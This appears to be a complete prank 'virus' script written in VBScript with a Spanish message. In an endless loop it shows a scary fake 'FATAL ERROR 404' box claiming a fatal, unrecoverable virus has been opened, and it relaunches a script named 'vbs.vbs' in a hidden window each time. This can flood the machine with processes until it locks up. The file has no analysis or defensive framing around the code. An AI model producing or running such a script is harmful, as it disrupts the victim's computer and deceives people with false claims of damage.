do
lol=msgbox("¡Has abierto un virus fatal la macate, no hay restauracion!",20,"FATAL ERROR 404") 
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "vbs.vbs" & Chr(34), 0
Set WshShell = Nothing 
loop

